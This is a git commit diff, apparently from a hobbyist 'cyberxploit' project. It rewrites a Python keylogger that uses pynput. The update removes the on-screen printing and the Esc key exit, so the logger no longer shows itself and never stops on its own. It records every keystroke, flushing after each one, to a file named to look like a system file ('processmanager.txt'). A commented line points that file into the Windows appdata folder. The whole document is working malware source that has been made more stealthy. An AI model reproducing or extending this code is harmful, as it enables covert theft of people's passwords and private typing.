68e28996445d177adc83d3bfb3e7abf85f3fe32d
cyberxploit <cyberxploit166@gmail.com>
2023-08-31 18:57:03 +0100

    update key.py file

--- keylogger.py
+++ keylogger.py
@@ -1,57 +1,44 @@
-############################################################
-#####                   CYBERXPLOIT                    #####
-##### PROJECT NAME: KEYLOGGER                          #####
-##### PROJECT ID: CYBX008                              #####
-#####                                                  #####
-############################################################
+import os
+from pynput.keyboard import Listener
 
-
-#IMPORTING THE MODULE
-import pynput
-from pynput.keyboard import Key, Listener
-
-#DECLARING VARIABLES
-count = 0
 keys = []
+count = 0
+#path = os.environ['appdata'] +'\\processmanager.txt'
+path = "processmanager.txt"
 
-#ON PRESS FUNCTION(INPUTED KEYSTROKE)
+
 def on_press(key):
-    global keys, count
+	global keys, count
 
-    keys.append(key)
-    count += 1
-    print(f"{key} pressed")
+	keys.append(key)
+	count += 1
 
-    if count >= 10:
-        count = 0
-        write_file(keys)
-        keys = []
+	if count >= 1:
+		count = 0
+		write_file(keys)
+		keys = []
 
-#WRITING KEYSTROKE TO A TEXT FILE
+
 def write_file(keys):
-    with open("log.txt", 'a') as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:               
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k) 
+	with open(path, 'a') as f:
+		for key in keys:
+			k = str(key).replace("'", "")
+			if k.find('backspace') > 0:
+				f.write(' Backspace ')
+			elif k.find('enter') > 0:
+				f.write('\n')
+			elif k.find('shift') > 0:
+				f.write(' Shift ')
+			elif k.find('space') > 0:
+				f.write(' ')
+			elif k.find('caps_lock') > 0:
+				f.write(' caps_lock ')
+			elif k.find('key'):
+				f.write(k)
 
-#ON RELEASE FUNCTION              
-def on_release(key):
-    if key == Key.esc:
-        return False  
-
-#LISTENER BASED ON (ON PRESSED AND ON RELEASE OF KEYSTROKES)
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
 
 
-############################################################
-#####                   CYBERXPLOIT                    #####
-##### PROJECT NAME: KEYLOGGER                          #####
-##### PROJECT ID: CYBX008                              #####
-#####                                                  #####
-############################################################
+with Listener(on_press=on_press) as listener:
+	listener.join()
 
- 
+
